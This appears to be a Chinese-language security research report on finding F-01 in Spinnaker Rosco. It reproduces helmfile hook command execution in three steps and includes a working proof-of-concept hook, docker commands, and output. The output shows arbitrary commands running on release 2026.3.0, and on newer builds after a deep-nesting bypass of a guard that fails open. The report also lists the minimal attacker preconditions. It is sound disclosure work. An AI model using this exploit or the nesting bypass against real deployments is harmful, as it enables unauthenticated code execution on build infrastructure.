@@ -1,0 +1,99 @@
+# F-01 攻击条件实证 —— 2026-09-19 重跑（回答"攻击条件 / 跨边界 / 手动复现"）
+
+环境：本机 Docker，rosco 镜像两种 tag 并存；活栈 10 容器在跑。
+目的：把"攻击条件"从文字描述变成三组可复跑的实验，分别锁死
+      ① payload 语法是否成立、② 守卫是否存在（版本分档）、③ 守卫是否真的 fail-open。
+
+================================================================================
+L1  入口 hook 在【已发行版】上直接执行  （rosco:2026.3.0）
+================================================================================
+输入文件 poc/hookdemo/helmfile.yaml（无嵌套、无 bases、无远程引用，纯入口）：
+
+  hooks:
+    - events: ["prepare"]
+      command: "/bin/sh"
+      args: ["-c", "id > /tmp/HOOK_PROOF.txt; echo hook-ran"]
+  releases: []
+
+命令：
+  docker run --rm -v "$PWD/poc/hookdemo:/poc:ro" --entrypoint bash \
+    ghcr.io/spinnaker/rosco:2026.3.0 -c \
+    'cp /poc/helmfile.yaml /tmp/h.yaml &&
+     helmfile template --file /tmp/h.yaml --helm-binary helm3; echo "exit=$?";
+     echo "--- proof ---"; cat /tmp/HOOK_PROOF.txt'
+
+输出：
+  err: no releases found that matches specified selector() and environment(default), in any helmfile
+  exit=3
+  --- proof ---
+  uid=10111(spinnaker) gid=10111(spinnaker) groups=10111(spinnaker),10111(spinnaker)
+
+结论：
+  (a) 入口文件写 `hooks:` 即执行，无需任何绕过 —— 这是"≤2026.3.0 全部已发行版"的条件。
+  (b) **hook 不依赖 bake 成功**：helmfile 最终 exit=3（无 release 可渲染），
+      但 `prepare` 事件已先执行完，proof 文件已落地。
+      → 攻击者不需要让 bake 跑绿，失败路径同样拿到代码执行。
+
+================================================================================
+L2  守卫是否存在于镜像里（字节级，二值判定）
+================================================================================
+  for tag in 2026.3.0 main-latest; do 解包 /opt/rosco/lib/rosco-manifests-*.jar
+       strings .../helmfile/HelmfileTemplateUtils.class | grep -c rejectHooksAndPostRenderers
+
+  ghcr.io/spinnaker/rosco:2026.3.0    guard hits = 0     class bytes = 11334
+  ghcr.io/spinnaker/rosco:main-latest guard hits = 1     class bytes = 19189
+
+结论：守卫是 main-only 的全新代码（PR #8015 / 1dce54db，2026-09-14 合入，
+      最新发行版 2026.3.0 发布于 2026-09-07，早 7 天）。
+      → "要不要绕过"是一个**先查版本**的判定，不是默认前提。
+
+================================================================================
+L3  服务级 A/B（活栈重跑，唯一变量 = YAML 嵌套深度）
+================================================================================
+命令（脚本须在 rosco 容器内跑：marker 写在 rosco 的 /tmp，且 API 在同容器）：
+  docker cp poc-ab.sh spinnaker-poc-rosco-1:/tmp/poc-ab.sh
+  docker exec spinnaker-poc-rosco-1 bash /tmp/poc-ab.sh
+
+同一段 hooks:，clean.yaml（可解析）与 evil.yaml（同文档含 59 层嵌套）对比：
+
+################## CONTROL  (parseable, guard must reject)   (clean.yaml)
+HTTP=400 bytes=568
+{"timestamp":"2026-09-19T04:21:56.617+00:00","status":400,"error":"Bad Request",
+ "exception":"java.lang.IllegalArgumentException",
+ "message":"The helmfile content at /tmp/rosco-7320422336972392485/ba4061b3-... declares `hooks`,
+            which helmfile executes as an arbitrary local com..."}
+--- hook side effect ---
+  [ok] no marker - hook did not run
+
+################## PAYLOAD  (deep nesting, guard fails open)   (evil.yaml)
+HTTP=200 bytes=249
+{"type":"embedded/base64","customKind":false,"name":"poc-manifests",
+ "reference":"LS0tCiMgU291cmNlOiBkZW1v..."}
+--- hook side effect ---
+  [!!] COMMAND EXECUTED - marker present:
+      === F-01 rosco helmfile hook executed ===
+      uid=10111(spinnaker) gid=10111(spinnaker) groups=10111(spinnaker),10111(spinnaker)
+      44c48ade52c2
+      Sat Sep 19 04:21:58 UTC 2026
+      cwd=/tmp/rosco-11159780981870441902
+      staging=/tmp/ROSCO_UI_POC.txt /tmp/bake_resp.json /tmp/bakeenv /tmp/helmfile2047797448 /tmp/hsperfdata_spinnaker
+      beacon_http=404
+
+结论：守卫**本身工作正常**（control 被 400 明确拒绝、hook 未执行），
+      唯一让它失效的是"解析失败即放行"（G3，catch RuntimeException -> log.debug -> return）。
+      同一段 hook，只多 59 层嵌套就出去了 —— 这是 G3 而非"守卫没写对"。
+
+================================================================================
+复现三分法（对应"如何手动复现"）
+================================================================================
+  L1 = 证明"payload 语法成立"        （30 秒，1 个容器，无需栈）
+  L2 = 证明"守卫在不在"              （10 秒，决定走哪条路径）
+  L3 = 证明"守卫会拒 / 会放"         （活栈，A/B，唯一变量原则）
+  L4（已另存）= Deck UI 端到端       （见 deck-ui-run.txt / execution-*.json）
+
+常见误解（实测排除，均非必要攻击条件）：
+  - 不需要 git 制品账户 / 不需要 tarball  → `type: http/file` 走"制品即入口 helmfile"
+    分支（HelmBakeTemplateUtils:92-115），一个无凭据 HTTP 源即可
+  - 不需要 Spinnaker / pipeline 写权限   → 起点只是"能影响制品内容的人"
+  - 不需要 timing / 重试                → 与 F-02/F-03 的 TOCTOU 不同，本条是确定性的
+  - 不需要目标出网                      → hook 是本地执行；出网只是观察用的 beacon
